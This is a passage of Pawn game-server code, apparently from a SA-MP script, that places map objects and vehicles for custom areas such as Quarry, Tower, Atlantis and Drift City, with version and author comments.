	CreateSObject(3460, -1982.987061, 282.876953, 38.179745, 0.0000, 0.0000, 90.0000);
	CreateSObject(1568, -1953.481689, 277.154999, 40.057987, 0.0000, 0.0000, 0.0000);
	CreateSObject(10281, -1956.085449, 250.514832, 41.534645, 0.0000, 345.3896, 0.0773);
	CreateSObject(3471, -1963.609863, 296.224609, 35.743290, 0.0000, 0.0000, 0.0000);
	CreateSObject(3471, -1963.528198, 291.868042, 35.748466, 0.0000, 0.0000, 0.0000);
	CreateSObject(8674, -1893.714233, 243.519562, 41.513790, 0.0000, 0.0000, 258.7500);
	CreateSObject(8674, -1891.698730, 253.517471, 41.513790, 0.0000, 0.0000, 78.7500);
	CreateSObject(8674, -1895.741943, 232.493515, 39.502037, 0.0000, 0.0000, 258.7500);
	CreateSObject(8674, -1897.040283, 222.296616, 39.559467, 0.0000, 359.1406, 266.5623);
	CreateSObject(8674, -1897.324463, 212.015518, 39.627594, 0.0000, 0.0000, 270.0000);
	CreateSObject(8674, -1897.659668, 204.848358, 39.595959, 0.0000, 0.0000, 265.7028);
	CreateSObject(8674, -1905.764282, 203.998444, 35.582699, 0.0000, 0.0000, 0.0000);
	CreateSObject(8674, -1912.945923, 203.980988, 35.623898, 0.0000, 0.0000, 0.0000);
	CreateSObject(8674, -1918.112671, 209.133850, 35.607685, 0.0000, 0.0000, 270.0000);
	CreateSObject(8674, -1918.109131, 213.243896, 35.628052, 0.0000, 0.0000, 90.0000);
	CreateSObject(973, -1919.308228, 223.450073, 34.740200, 0.0000, 0.0000, 90.0000);
	CreateSObject(8407, -1982.722168, 282.892426, 35.250256, 2.5783, 0.0000, 269.1406);
	// 0.4.0 - Bumper (BroLeX):
	CreateSObject(7418, 1347.908447, 2149.583008, 12.634029, 0.0000, 0.0000, 0.0000);
	CreateSObject(1278, 1376.611450, 2196.285645, 27.438925, 0.0000, 0.0000, 0.0000);
	CreateSObject(1278, 1393.831909, 2175.811523, 27.438925, 0.0000, 0.0000, 285.2290);
	CreateSObject(1278, 1327.081543, 2196.454346, 24.212912, 0.0000, 0.0000, 0.0000);
	CreateSObject(1278, 1395.050171, 2131.330811, 24.212912, 0.0000, 0.0000, 289.5262);
	// 0.4.0 - Quarry (BroLeX):
	CreateSObject(18609, 682.738342, 849.818787, -39.588436, 12.0321, 0.0000, 62.7389);
	CreateSObject(18367, 674.604065, 863.569336, -49.148396, 331.6386, 0.0000, 73.0521);
	CreateSObject(16367, 474.112793, 880.308838, -29.089787, 0.0000, 0.0000, 0.0000);
	CreateSObject(13640, 631.768860, 811.291443, -42.940666, 0.0000, 0.0000, 351.4056);
	CreateSObject(16644, 801.475098, 857.165161, 14.904968, 1.7189, 341.9518, 295.5422);
	CreateSObject(1225, 760.200134, 847.976929, -8.016648, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 751.139282, 801.442017, -8.007792, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 737.559753, 936.752502, -8.007819, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 687.997620, 969.180359, -13.378689, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 624.151855, 907.464294, -44.830032, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 658.532898, 886.188110, -41.549664, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 658.366455, 901.995667, -41.400940, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 607.170471, 868.339050, -40.808361, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 639.347778, 857.219543, -40.819794, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 637.682678, 826.354614, -40.793236, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 641.199829, 843.894226, -34.396271, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 602.946960, 830.072998, -30.922886, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 575.265381, 872.115479, -36.673599, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, 551.353455, 878.608276, -37.606537, 0.0000, 0.0000, 0.0000);
	CreateSObject(4638, 833.261169, 865.533936, 13.216340, 0.0000, 0.0000, 286.9479);
	CreateSObject(11326, 855.589478, 880.404114, 14.671446, 0.0000, 0.0000, 204.4420);
	// 0.4.0 - Tower (BroLeX):
	CreateSObject(16644, 1524.228149, -1376.866699, 328.858215, 0.0000, 0.0000, 46.7189);
	CreateSObject(16644, 1515.174438, -1359.827637, 328.736053, 0.0000, 0.8594, 8.0443);
	CreateSObject(16644, 1518.650269, -1341.292236, 328.794891, 0.0000, 0.0000, 329.0603);
	CreateSObject(16644, 1534.668823, -1329.327515, 328.778595, 0.0000, 0.0000, 289.5262);
	CreateSObject(16644, 1555.904419, -1330.263184, 328.703522, 0.0000, 0.0000, 244.8355);
	CreateSObject(16644, 1571.246582, -1342.922729, 328.705597, 0.0000, 0.0000, 205.3015);
	CreateSObject(16644, 1573.886108, -1360.859131, 328.680206, 0.0000, 0.0000, 170.9240);
	CreateSObject(16644, 1563.598267, -1377.271729, 328.780182, 0.0000, 0.0000, 130.5305);
	CreateSObject(16644, 1543.770142, -1383.516724, 328.711853, 0.0000, 0.0000, 87.5587);
	CreateSObject(3666, 1507.668091, -1360.069580, 329.390411, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1508.023071, -1362.395874, 329.391602, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1512.673462, -1336.819580, 329.317383, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1511.532593, -1338.774292, 329.343170, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1533.032471, -1322.070923, 329.303986, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1530.753296, -1322.866211, 329.300507, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1557.715332, -1322.924561, 329.239166, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1559.763428, -1323.926758, 329.221436, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1577.324829, -1338.413818, 329.240356, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1578.285522, -1340.517334, 329.227081, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1581.421753, -1360.548096, 329.190216, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1581.102661, -1362.868530, 329.204193, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1569.562012, -1381.973633, 329.302734, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1567.818970, -1383.452148, 329.339203, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1544.967285, -1390.956421, 329.247711, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1542.644897, -1390.850708, 329.235596, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1520.167969, -1383.319580, 329.422882, 0.0000, 0.0000, 22.5000);
	CreateSObject(3666, 1518.539063, -1381.685791, 329.382385, 0.0000, 0.0000, 22.5000);
	// 0.4.0 - Cannon:
	CreateSObject(3502, -547.270142, 2593.982910, 53.819229, 0.0000, 0.0000, 269.7591);
	CreateSObject(2780, -547.034119, 2593.882324, 48.858860, 0.0000, 0.0000, 0.0000);
	CreateSObject(3749, -540.559875, 2594.434326, 58.273838, 0.0000, 0.0000, 269.7591);
	CreateSObject(17324, -550.988953, 2594.201172, 52.411087, 0.0000, 0.0000, 91.1003);
	CreateSObject(5811, -543.086060, 2589.847412, 50.941620, 0.0000, 0.0000, 268.0403);
	CreateSObject(5811, -542.930115, 2598.003418, 50.966576, 0.0000, 0.0000, 268.0403);
	CreateSObject(5811, -543.355408, 2599.220459, 58.109230, 0.0000, 270.6186, 87.6625);
	CreateSObject(2780, -549.165588, 2590.478760, 52.934780, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -548.456116, 2598.136475, 52.733784, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -560.507813, 2592.180176, 54.717590, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -553.260742, 2593.731445, 52.934780, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -553.619019, 2592.513672, 52.934780, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -553.460754, 2593.193359, 53.057842, 0.0000, 0.0000, 0.0000);
	CreateSObject(18256, -496.999207, 2587.837891, 48.536819, 358.2811, 338.5141, 4.2972);
	for(new i = 0; i < 10; i++) CreateVehicleEx(590,-545.7040,2594.0491,54.4306,177.9398,0,0);
	CreateVehicleEx(411,-508.2006,2637.6880,53.1411,90.4616,123,1); // cannonvinf
	CreateVehicleEx(411,-509.0674,2630.6191,53.1411,91.5440,123,1); // cannonvinf
	CreateVehicleEx(411,-509.0674,2623.6191,53.1411,91.5440,123,1); // cannonvinf
	CreateVehicleEx(411,-509.0674,2616.6191,53.1411,91.5440,123,1); // cannonvinf
	CreateVehicleEx(411,-509.0674,2609.6191,53.1411,91.5440,123,1); // cannonvinf
	// 0.4.0 - FirePlace:
	fpinfo[fpStart] = CreateSObject(971, -684.489990, 2359.088379, 162.174698, 0.0000, 3.4377, 289.9217);
	CreateSObject(971, -681.490662, 2350.940918, 161.646271, 0.0000, 3.4377, 290.7811);
	CreateSObject(971, -678.387146, 2342.709717, 161.154785, 0.0000, 2.5783, 290.7811);
	CreateSObject(971, -676.806091, 2338.532959, 160.967682, 0.0000, 2.5783, 289.9217);
	CreateSObject(971, -670.972839, 2335.161621, 160.679352, 0.0000, 0.8594, 9.5312);
	CreateSObject(971, -662.375061, 2336.495117, 160.479599, 0.0000, 1.7189, 7.8122);
	CreateSObject(971, -653.602783, 2337.790039, 160.211243, 0.0000, 1.7189, 8.6717);
	CreateSObject(971, -644.851196, 2339.099365, 159.921997, 0.0000, 1.7189, 8.6717);
	CreateSObject(971, -640.501526, 2339.742188, 159.729889, 0.0000, 1.7189, 7.8122);
	CreateSObject(971, -635.003540, 2344.388428, 159.769211, 0.0000, 2.5783, 253.5934);
	CreateSObject(971, -632.521423, 2352.856934, 160.135712, 0.0000, 2.5783, 253.5934);
	CreateSObject(971, -629.998291, 2361.304199, 160.502441, 0.0000, 2.5783, 253.5934);
	CreateSObject(971, -629.081116, 2364.423340, 160.634369, 0.0000, 2.5783, 253.5934);
	CreateSObject(971, -628.304260, 2373.043945, 161.049713, 0.0000, 2.5783, 276.0934);
	CreateSObject(971, -629.188599, 2381.792236, 161.414948, 0.0000, 2.5783, 276.0934);
	CreateSObject(971, -629.783447, 2385.314209, 161.620117, 0.0000, 2.5783, 278.6717);
	CreateSObject(971, -633.489502, 2392.789795, 161.996292, 0.0000, 2.5783, 314.1406);
	CreateSObject(971, -639.524292, 2399.071045, 162.055511, 0.0000, 359.1406, 314.1406);
	CreateSObject(971, -643.586060, 2403.355713, 161.872055, 0.0000, 358.2811, 314.1406);
	CreateSObject(971, -684.802185, 2367.390137, 162.640671, 0.0000, 3.4377, 254.4529);
	CreateSObject(971, -682.326538, 2375.885254, 163.172607, 0.0000, 3.4377, 252.7340);
	CreateSObject(971, -680.473694, 2382.010010, 163.550446, 0.0000, 3.4377, 254.4529);
	CreateSObject(971, -676.205078, 2389.167969, 164.029495, 0.0000, 3.4377, 222.3445);
	CreateSObject(971, -669.737122, 2394.492188, 163.967239, 0.0000, 356.5623, 217.1106);
	CreateSObject(971, -662.468811, 2399.217773, 163.271378, 0.0000, 354.8434, 209.3756);
	CreateSObject(971, -654.705200, 2402.972168, 162.520477, 0.0000, 354.8434, 202.5000);
	CreateSObject(971, -650.350403, 2404.936768, 162.009796, 0.0000, 354.8434, 205.0784);
	fpinfo[fpEnd] = CreateSObject(971, -672.007568, 2392.880371, 157.070908, 0.0000, 359.1406, 220.6256);
	fpinfo[fpUpdate] = fpinfo[fpStart];
	// 0.4.5 - Cristmeas (SaMaRa):
	CreateSObject(656, 1088.750000, 1074.462524, 9.936775, 0.0000, 0.0000, 236.2500);
	CreateSObject(974, 1071.592163, 1074.728882, 12.541533, 0.0000, 0.0000, 88.2812);
	CreateSObject(974, 1072.438843, 1068.643066, 12.585356, 0.0000, 0.0000, 287.3434);
	CreateSObject(974, 1072.955200, 1080.794312, 12.526543, 0.0000, 0.0000, 246.6406);
	CreateSObject(974, 1076.394165, 1085.818604, 12.613678, 0.0000, 0.0000, 225.0000);
	CreateSObject(974, 1080.782593, 1089.059082, 12.613678, 0.0000, 0.0000, 206.8745);
	CreateSObject(974, 1087.083618, 1090.705566, 12.613678, 0.0000, 0.0000, 181.7961);
	CreateSObject(974, 1093.146240, 1089.999634, 12.615898, 0.0000, 0.0000, 348.7500);
	CreateSObject(974, 1097.086914, 1088.303467, 12.493511, 0.0000, 0.0000, 329.6877);
	CreateSObject(1523, 1099.876831, 1086.579834, 9.830095, 0.0000, 0.0000, 307.1877);
	CreateSObject(1523, 1101.685303, 1084.205078, 9.807871, 0.0000, 0.0000, 126.3283);
	CreateSObject(974, 1103.231689, 1081.275146, 12.615898, 0.0000, 0.0000, 295.9378);
	CreateSObject(974, 1104.781250, 1074.965698, 12.611509, 0.0000, 0.0000, 271.7962);
	CreateSObject(974, 1103.581055, 1068.519165, 12.613678, 0.0000, 0.0000, 247.5001);
	CreateSObject(974, 1100.307495, 1062.938965, 12.613678, 0.0000, 0.0000, 231.8756);
	CreateSObject(1523, 1073.416504, 1065.498413, 10.027014, 0.0000, 0.0000, 308.9066);
	CreateSObject(1523, 1075.408813, 1063.184570, 10.025646, 0.0000, 0.0000, 128.9066);
	CreateSObject(974, 1078.059448, 1061.191528, 12.615898, 0.0000, 0.0000, 142.7350);
	CreateSObject(974, 1083.945435, 1058.335815, 12.613678, 0.0000, 0.0000, 165.2350);
	CreateSObject(974, 1090.469604, 1057.982422, 12.613678, 0.0000, 0.0000, 187.7351);
	CreateSObject(974, 1096.227661, 1059.740967, 12.613678, 0.0000, 0.0000, 209.3756);
	CreateSObject(992, 1074.668335, 1064.427734, 14.041503, 0.0000, 0.0000, 130.6255);
	CreateSObject(992, 1100.593140, 1085.312988, 13.841537, 0.0000, 0.0000, 305.4689);
	CreateSObject(3472, 1088.329956, 1074.522217, 16.582394, 0.0000, 0.0000, 29.2208);
	CreateSObject(3472, 1088.291016, 1074.401123, 11.193541, 0.0000, 0.0000, 356.4076);
	CreateSObject(3472, 1088.550537, 1074.289795, 19.455097, 0.0000, 0.0000, 82.0331);
	CreateSObject(3666, 1087.347656, 1075.668091, 19.851843, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 1088.650269, 1072.439697, 19.599623, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 1091.030396, 1073.822510, 30.599623, 0.0000, 0.0000, 0.0000);
	CreateSObject(7666, 1088.523804, 1074.422363, 36.559074, 0.0000, 0.0000, 56.2500);
	CreateSObject(1575, 1087.723145, 1073.652832, 9.915583, 354.8434, 324.7631, 56.2500);
	CreateSObject(1576, 1087.635864, 1074.964844, 9.890585, 0.0000, 330.7792, 326.2500);
	CreateSObject(1577, 1089.059082, 1073.982910, 9.838364, 0.0000, 323.0442, 146.2500);
	CreateSObject(1578, 1088.709595, 1075.158569, 9.888363, 0.0000, 34.3775, 56.2500);
	CreateSObject(1579, 1087.294922, 1074.168823, 9.865583, 0.0000, 323.0442, 0.0000);
	CreateSObject(1580, 1089.331909, 1074.628052, 9.974356, 0.0000, 40.3935, 11.2500);
	CreateSObject(3666, 1088.525024, 1073.100708, 10.349623, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 1088.141479, 1075.693359, 10.351843, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 1086.904053, 1073.760986, 10.351843, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 1089.982422, 1074.835693, 10.349623, 0.0000, 0.0000, 0.0000);
	// 0.4.5 - Atlantis (SaMaRa):
	CreateSObject(11427, 2982.099121, -1695.175171, -57.388638, 0.0000, 0.0000, 327.2641);
	CreateSObject(10023, 3119.546631, -1658.453247, -61.515961, 0.0000, 0.0000, 270.0000);
	CreateSObject(10377, 3064.753662, -1658.985596, -87.245598, 0.0000, 0.0000, 180.0000);
	CreateSObject(10023, 3050.793945, -1659.029541, -61.527092, 0.0000, 0.0000, 90.0000);
	CreateSObject(8210, 3085.276611, -1697.261597, -66.719620, 0.0000, 0.0000, 0.0000);
	CreateSObject(8210, 3085.334961, -1619.858887, -66.713829, 0.0000, 0.0000, 180.0000);
	CreateSObject(3441, 3100.357422, -1650.351685, -67.856110, 0.0000, 0.0000, 0.0000);
	CreateSObject(3441, 3100.917725, -1665.812378, -67.856110, 0.0000, 0.0000, 0.0000);
	CreateSObject(3494, 3127.120117, -1658.573730, -65.806870, 0.0000, 0.0000, 0.0000);
	CreateSObject(3494, 3042.223877, -1659.380005, -65.818001, 0.0000, 0.0000, 0.0000);
	CreateSObject(8882, 3092.818115, -1806.522949, -55.641300, 0.0000, 0.0000, 354.8434);
	CreateSObject(8493, 3098.659180, -1580.170044, -51.042694, 9.4538, 1.7189, 326.2500);
	CreateSObject(6866, 3082.962402, -1652.511230, -46.208061, 0.0000, 0.0000, 11.2501);
	CreateSObject(1601, 3074.162109, -1638.849243, -69.422821, 0.0000, 0.0000, 337.5000);
	CreateSObject(1606, 3071.656982, -1788.544312, -68.888947, 0.0000, 0.0000, 337.5000);
	CreateSObject(1608, 3048.461182, -1701.237671, -50.147247, 0.0000, 0.0000, 56.2500);
	CreateSObject(1609, 2979.562500, -1693.418701, -64.276787, 0.0000, 0.0000, 33.7500);
	CreateSObject(1607, 3082.687256, -1592.949463, -61.849449, 31.7992, 354.8434, 95.1566);
	CreateSObject(1605, 3043.627930, -1642.637085, -69.419334, 0.0000, 0.0000, 56.2500);
	CreateSObject(903, 3084.014893, -1762.652344, -63.994408, 0.0000, 0.0000, 0.0000);
	CreateSObject(11459, 2972.713135, -1594.304443, -67.829414, 0.0000, 0.0000, 157.5000);
	CreateSObject(11458, 2952.583252, -1649.892334, -66.976883, 0.0000, 0.0000, 236.2501);
	CreateSObject(11457, 2974.414551, -1625.883423, -69.197266, 0.0000, 0.0000, 135.0000);
	CreateSObject(11445, 2938.543701, -1693.908325, -63.495216, 0.0000, 0.0000, 326.2500);
	CreateSObject(11428, 2948.415527, -1732.360840, -56.248631, 0.0000, 0.0000, 303.7500);
	CreateSObject(3666, 3069.107666, -1642.439453, -69.306961, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 3086.405518, -1660.090454, -69.306961, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 3072.063477, -1674.493164, -69.306961, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 3054.496338, -1657.154785, -69.306961, 0.0000, 0.0000, 0.0000);
	CreateSObject(1215, 3060.510498, -1671.367310, -69.256325, 0.0000, 0.0000, 0.0000);
	CreateSObject(1215, 3082.666504, -1668.607544, -69.256325, 0.0000, 0.0000, 0.0000);
	CreateSObject(1215, 3080.503906, -1645.870728, -69.250542, 0.0000, 0.0000, 0.0000);
	CreateSObject(1215, 3061.288086, -1645.623901, -69.256325, 0.0000, 0.0000, 0.0000);
	CreateSObject(8491, 3061.901123, -1679.699829, -23.263252, 0.0000, 0.0000, 146.2500);
	CreateSObject(8492, 3041.098877, -1637.221924, -48.614105, 0.0000, 0.0000, 236.2500);
	CreateSObject(14608, 3105.789795, -1658.432495, -67.549637, 0.0000, 0.0000, 45.0000);
	CreateSObject(5812, 2998.089600, -1657.002197, -69.622490, 0.0000, 0.0000, 270.0000);
	CreateSObject(3515, 3033.103271, -1667.762817, -69.003746, 0.0000, 0.0000, 0.0000);
	CreateSObject(3515, 3034.610840, -1645.665161, -68.713997, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 3023.859131, -1652.659424, -68.871689, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 3024.219727, -1663.402466, -68.970627, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 3009.528320, -1652.681396, -68.872917, 0.0000, 0.0000, 0.0000);
	CreateSObject(3666, 3008.589600, -1663.301880, -68.962524, 0.0000, 0.0000, 0.0000);
	// 0.4.5 - San Fierro Objects (SaMaRa):
	CreateSObject(3525, -2708.102539, 378.001190, 10.223433, 356.5623, 357.4217, 0.0000);
	CreateSObject(3525, -2704.521729, 378.033295, 9.198433, 353.1245, 0.0000, 0.0000);
	CreateSObject(3525, -2704.535645, 374.200623, 8.223433, 351.4056, 0.0000, 0.0000);
	CreateSObject(3525, -2708.045410, 374.220825, 7.223417, 350.5462, 0.0000, 0.0000);
	CreateSObject(3472, -2706.243164, 376.283325, 4.287976, 0.0000, 0.0000, 33.7500);
	CreateSObject(8660, -2729.504150, 353.590851, 4.396106, 0.0000, 0.0000, 0.0000);
	CreateSObject(8660, -2727.886719, 400.050354, 4.424233, 0.0000, 0.0000, 0.0000);
	CreateSObject(8660, -2684.388428, 352.076874, 4.371110, 0.0000, 0.0000, 0.0000);
	CreateSObject(8660, -2684.141846, 398.656708, 4.324232, 0.0000, 0.0000, 0.0000);
	CreateSObject(14804, -2672.496582, 390.763367, 4.837400, 0.0000, 0.0000, 33.7500);
	CreateSObject(14804, -2677.306885, 390.783936, 4.837400, 0.0000, 0.0000, 45.0000);
	CreateSObject(14804, -2683.404541, 390.892456, 4.837400, 0.0000, 0.0000, 45.0001);
	CreateSObject(14804, -2689.906250, 390.842224, 4.837400, 0.0000, 0.0000, 33.7500);
	CreateSObject(14804, -2696.209961, 390.818542, 4.837400, 0.0000, 0.0000, 45.0000);
	CreateSObject(14804, -2672.802979, 360.334747, 4.887401, 0.0000, 0.0000, 225.0000);
	CreateSObject(14804, -2677.879639, 360.250214, 4.887401, 0.0000, 0.0000, 213.7500);
	CreateSObject(14804, -2683.587646, 360.233734, 4.887401, 0.0000, 0.0000, 202.5000);
	CreateSObject(14804, -2689.255371, 360.267273, 4.887401, 0.0000, 0.0000, 202.5000);
	CreateSObject(14804, -2696.293213, 360.274170, 4.887401, 0.0000, 0.0000, 213.7500);
	CreateSObject(14804, -2716.490967, 360.318573, 4.887401, 0.0000, 0.0000, 225.0000);
	CreateSObject(14804, -2721.769287, 360.247925, 4.887401, 0.0000, 0.0000, 225.0000);
	CreateSObject(14804, -2727.386230, 360.245544, 4.887401, 0.0000, 0.0000, 213.7500);
	CreateSObject(14804, -2733.715820, 360.279877, 4.887401, 0.0000, 0.0000, 213.7500);
	CreateSObject(14804, -2740.235352, 360.408600, 4.887401, 0.0000, 0.0000, 225.0000);
	CreateSObject(14804, -2739.990967, 390.780151, 4.837400, 0.0000, 0.0000, 33.7500);
	CreateSObject(14804, -2734.637939, 390.804749, 4.837400, 0.0000, 0.0000, 33.7500);
	CreateSObject(14804, -2728.370605, 390.897491, 4.837400, 0.0000, 0.0000, 33.7500);
	CreateSObject(14804, -2722.306885, 390.855804, 4.837400, 0.0000, 0.0000, 22.5000);
	CreateSObject(14804, -2716.213379, 390.914642, 4.837400, 0.0000, 0.0000, 33.7500);
	CreateSObject(621, -2761.834473, 352.313263, 3.374699, 0.0000, 0.0000, 0.0000);
	CreateSObject(621, -2762.114014, 401.980316, 3.334490, 0.0000, 0.0000, 0.0000);
	CreateSObject(623, -2763.915283, 427.175812, 3.640048, 0.0000, 0.0000, 218.0472);
	CreateSObject(623, -2762.580078, 321.297485, 3.515592, 0.0000, 0.0000, 331.4066);
	CreateSObject(619, -2718.949219, 393.361542, 3.663455, 0.0000, 0.0000, 83.9066);
	CreateSObject(619, -2719.780273, 357.461823, 3.735330, 0.0000, 0.0000, 186.0933);
	CreateSObject(619, -2693.935547, 393.784302, 3.738455, 0.0000, 0.0000, 10.3132);
	CreateSObject(619, -2692.851318, 357.187073, 3.810330, 0.0000, 0.0000, 265.7028);
	CreateSObject(6965, -2769.674561, 362.013000, 6.288018, 0.0000, 0.0000, 0.0000);
	CreateSObject(6965, -2770.031006, 390.048309, 6.275269, 0.0000, 0.0000, 0.0000);
	// 0.4.5 - Drift City (SaMaRa):
	CreateSObject(8390, 1578.013428, -3911.336426, 20.041962, 0.0000, 0.0000, 281.2500);
	CreateSObject(10786, 1440.941895, -3912.213135, 14.312927, 10.3132, 0.0000, 101.2500);
	CreateSObject(4640, 1510.719116, -3921.180176, 2.433854, 0.0000, 0.0000, 101.2500);
	CreateSObject(1244, 1510.646362, -3923.438721, 1.536778, 0.0000, 0.0000, 11.2500);
	CreateSObject(1244, 1509.921265, -3918.974121, 1.536778, 0.0000, 0.0000, 10.3906);
	CreateSObject(10786, 1334.677368, -3845.229980, 30.749485, 10.3132, 6.8755, 57.1867);
	CreateSObject(10787, 1321.345459, -3753.747803, 38.040039, 15.4699, 0.8594, 55.6226);
	CreateSObject(18371, 1455.238892, -3708.293945, 29.204634, 12.0321, 0.8594, 8.5944);
	CreateSObject(17921, 1592.690552, -3694.136475, 29.359766, 358.2811, 349.6868, 102.1869);
	CreateSObject(17921, 1660.011353, -3719.919678, 27.547386, 1.7189, 0.0000, 282.9689);
	CreateSObject(17921, 1742.410889, -3721.146729, 27.526840, 1.7189, 0.0000, 103.9056);
	CreateSObject(17681, 1732.944702, -3774.626465, 22.262642, 0.0000, 351.4056, 103.9056);
	CreateSObject(17602, 1655.406860, -3869.322266, 5.190304, 343.6707, 357.4217, 93.5150);
	CreateSObject(1634, 1691.926270, -3812.436035, 19.333679, 0.0000, 0.0000, 191.2500);
	CreateSObject(1634, 1686.829834, -3813.357910, 19.377380, 0.0000, 0.0000, 191.2500);
	CreateSObject(17944, 1312.240601, -3631.941162, 23.329506, 0.0000, 0.0000, 112.5000);
	CreateSObject(17901, 1437.542603, -3615.439941, 4.038810, 0.0000, 0.0000, 270.0000);
	CreateSObject(17894, 1506.308838, -3621.481201, 21.552715, 0.0000, 0.0000, 348.7500);
	CreateSObject(17888, 1528.763916, -3582.704102, 16.094084, 0.0000, 0.0000, 270.0000);
	CreateSObject(17804, 1586.628662, -3583.332031, 19.954105, 0.0000, 0.0000, 78.7500);
	CreateSObject(17690, 1750.143066, -3671.635986, 4.972004, 0.0000, 0.0000, 247.5000);
	CreateSObject(17679, 1746.273560, -3887.539063, 17.940968, 0.0000, 0.0000, 326.2500);
	CreateSObject(17560, 1857.983276, -3805.522461, 27.645008, 0.0000, 0.0000, 326.2500);
	CreateSObject(17553, 1873.904663, -3694.251953, 14.980391, 0.0000, 0.0000, 292.5000);
	CreateSObject(17551, 1804.598022, -3647.716553, 10.330225, 0.0000, 0.0000, 258.7500);
	CreateSObject(17547, 1568.354858, -3790.895996, 25.724731, 0.0000, 0.0000, 292.5000);
	CreateSObject(18469, 1748.204102, -3621.373535, 4.216961, 0.0000, 0.0000, 101.2500);
	CreateSObject(18469, 1840.195923, -3908.281738, 29.558922, 0.0000, 0.0000, 0.0000);
	CreateSObject(18469, 1883.511597, -3721.428955, 20.593266, 0.0000, 0.0000, 45.0000);
	CreateSObject(18363, 1639.262573, -3527.533691, 36.789814, 0.0000, 0.0000, 348.7500);
	CreateSObject(18355, 1420.896973, -3428.702148, -24.942345, 0.0000, 0.0000, 247.5000);
	CreateSObject(18319, 1264.536865, -3558.354248, 76.739777, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1694.894165, -3849.377441, 18.064812, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1673.509766, -3862.474609, 10.880913, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1673.458984, -3889.544189, 9.280879, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1680.956055, -3807.735840, 19.293427, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1705.865601, -3794.520264, 20.366137, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1714.780640, -3775.469482, 22.931782, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1761.080811, -3780.676270, 20.549753, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1783.589111, -3732.622070, 26.359623, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1752.963867, -3720.959961, 27.329044, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1748.784302, -3737.924072, 27.513721, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1723.346558, -3727.892822, 28.161512, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1702.421997, -3727.829346, 28.823158, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1683.675415, -3699.297119, 28.503653, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1657.742554, -3718.275391, 27.656054, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1625.050171, -3695.230469, 28.869776, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1599.844116, -3711.506348, 26.286478, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1567.901001, -3692.111572, 29.755991, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1540.255737, -3706.144775, 28.343010, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1510.050659, -3690.403809, 33.037033, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1500.166016, -3713.018066, 29.711927, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1464.766846, -3697.417480, 34.042625, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1440.608398, -3719.124512, 30.149019, 0.0000, 0.0000, 0.0000);
	CreateSObject(617, 1396.151733, -3706.999268, 34.279076, 0.0000, 0.0000, 0.0000);
	// 0.4.5 - Stunts World (SaMaRa)
	CreateSObject(8355, 1453.740967, -2499.681152, 29.306610, 339.3735, 0.0000, 90.8594,object_show_distance,-1,world_wstunts);
	CreateSObject(8355, 1587.500732, -2497.530273, 53.667233, 0.0000, 0.0000, 270.8595,object_show_distance,-1,world_wstunts);
	CreateSObject(8355, 1720.208862, -2495.583252, 26.444151, 23.2048, 0.0000, 90.8594,object_show_distance,-1,world_wstunts);
